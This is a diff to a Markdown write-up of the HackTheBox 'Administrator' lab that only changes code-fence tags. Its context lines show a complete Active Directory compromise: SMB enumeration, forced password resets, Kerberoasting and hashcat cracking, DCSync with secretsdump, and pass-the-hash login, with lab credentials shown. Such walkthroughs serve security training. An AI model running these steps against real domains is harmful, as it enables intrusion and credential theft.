@@ -3,7 +3,7 @@
 **Given Credetial: Username: Olivia Password: ichliebedich**
 
 First start with Nmap scan
-```bash
+```jsx
 $ nmap 10.10.11.42              
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 17:21 EST
 Nmap scan report for administrator.htb (10.10.11.42)
@@ -28,7 +28,7 @@ Here, we can see that port 21 for FTP is open, the SMB port is open, and the sys
 
 To have a comprehensive overview, apply a detailed scan, including service version detection and a default script scan.
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sV -sC -A 10.10.11.42
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 17:23 EST
@@ -80,7 +80,7 @@ From here, we have the domain `administrator.htb`.
 
 To ensure our system resolves `administrator` to `10.10.11.42`, we need to verify the hostname resolution.
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ sudo cat /etc/hosts
 [sudo] password for kali: 
@@ -93,7 +93,7 @@ To ensure our system resolves `administrator` to `10.10.11.42`, we need to verif
 
 Now, we use `netexec` for SMB user enumeration.
 
-```bash
+```jsx
 ──(kali㉿kali)-[~]
 └─$ netexec smb 10.10.11.42 -u Olivia  -p  'ichliebedich' --users --rid-brute
 
@@ -117,7 +117,7 @@ Here, the output shows usernames like `ethan`, `emma`, and others.
 
 To view SMB shares, we use `smbclient`, and we have different SMB shares.
 
-```bash
+```jsx
 ──(kali㉿kali)-[~]
 └─$ smbclient -L  \\\\10.10.11.42\\ -U Olivia      
 Password for [WORKGROUP\Olivia]:
@@ -140,7 +140,7 @@ Here, I found no useful information.
 Now, we are able to gain a PowerShell session using `evil-winrm`.  
 Here, we will upload `SharpHound.exe` and run it to get a complete picture of the network.
 
-```bash
+```jsx
 *Evil-WinRM* PS C:\Users\olivia\Documents> ls
 *Evil-WinRM* PS C:\Users\olivia\Documents> upload /home/kali/SharpHound.exe
                                         
@@ -202,7 +202,7 @@ Now, we use `BloodHound` to analyze the Active Directory (AD) network.
 
 Run a `neo4j` console and open the file in `BloodHound` for further enumeration.
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ sudo neo4j console                                                       
 [sudo] password for kali: 
@@ -232,7 +232,7 @@ So, we open `evil-winrm` again and run the command below to change Michael's pas
 <img src="Imgs/image2.png" alt="error loading image">
 
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ evil-winrm -i 10.10.11.42 -u Olivia -p 'ichliebedich'    
                                         
@@ -256,7 +256,7 @@ Now, we open a PowerShell session again using the `Michael` account with the new
 
 Go back to `BloodHound` to check the outbound object control for `Michael`.
 
-```
+
 <img src="Imgs/image3.png" alt="error loading image">
 
 Since Michael has the `ForceChangePassword` privilege on Benjamin, we can change Benjamin's password without knowing the current one.
@@ -265,7 +265,7 @@ Since Michael has the `ForceChangePassword` privilege on Benjamin, we can change
 Set-ADAccountPassword -Identity Benjamin -NewPassword (ConvertTo-SecureString "HelloBenjamin" -AsPlainText -Force) -Reset
 ```
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ evil-winrm -i 10.10.11.42 -u Michael -p 'HelloMichael'
 
@@ -284,7 +284,7 @@ After changing the password, I tried to log in to the `Benjamin` account, but `e
 Let's try using `rpcclient` instead.
 
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ rpcclient -U "administrator.htb\Benjamin%HelloBenjamin" 10.10.11.42
 
@@ -311,7 +311,7 @@ For `Benjamin`, there is no outbound object control.
 When accessing FTP using Benjamin's credentials, I found a `.psafe3` file.  
 Download this file for further analysis.
 
-```bash                                                                                                                            
+```jsx                                                                                                                            
 ┌──(kali㉿kali)-[~]
 └─$ ftp 10.10.11.42                                                  
 Connected to 10.10.11.42.
@@ -333,7 +333,7 @@ local: Backup.psafe3 remote: Backup.psafe3
 
 The `Backup.psafe3` file is password-protected, so we use `John` to crack the password.
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ pwsafe Backup.psafe3
                                                                                                                                         
@@ -356,7 +356,7 @@ Here, we have three usernames and their passwords.
 
 <img src="Imgs/image4.png" alt="error loading image">
 
-```bash
+```jsx
 alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
 Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
 emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
@@ -364,7 +364,7 @@ emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
 
 Here, I found the user flag under the `Emily` account.
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~]
 └─$ evil-winrm -i 10.10.11.42 -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 
@@ -400,7 +400,7 @@ Now, we use `TargetedKerberoast.py` to exploit this permission, as suggested by 
 5. **Kerberos tickets** are extractable once an SPN exists on an account.  
 
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 targetedKerberoast.py -v -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 
@@ -425,7 +425,7 @@ If the issue **"Clock skew too great"** occurs, run the following command to fix
 - **Prepares for Kerberos Attacks:** If your machine's time is out of sync with the target **domain controller**, Kerberos-based attacks (e.g., **Pass-the-Ticket, AS-REP Roasting**) might fail.  
 
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ sudo ntpdate -u 10.10.11.42
 
@@ -437,7 +437,7 @@ CLOCK: time stepped by 3071.615925
 Now, the command has run successfully, and we have a **Kerberoasting hash** for the `Ethan` user.
 
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 targetedKerberoast.py -v -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 
@@ -458,7 +458,7 @@ $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$42b3ad3d3990612b72
 Now, run `hashcat` to crack the hash, and we obtain the password for the `Ethan` user.
 
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ hashcat -m 13100 -a 0 krb5tgs.txt /usr/share/wordlists/rockyou.txt --force 
 
@@ -500,7 +500,7 @@ Instead of dumping hashes from memory (like with `Mimikatz`'s `lsadump::sam`), *
 
 So, we use `secretsdump.py` to exploit this and retrieve password hashes.
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ impacket-secretsdump ethan:'limpbizkit'@administrator.htb
 
@@ -534,7 +534,7 @@ Now, we have the **hash for the Administrator**.
 We use `evil-winrm` to log in and grab the **root flag**.
 
 
-```bash
+```jsx
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ evil-winrm -i 10.10.11.42 -u administrator -H '************20bd016e098d2d2fd2e'
                                         
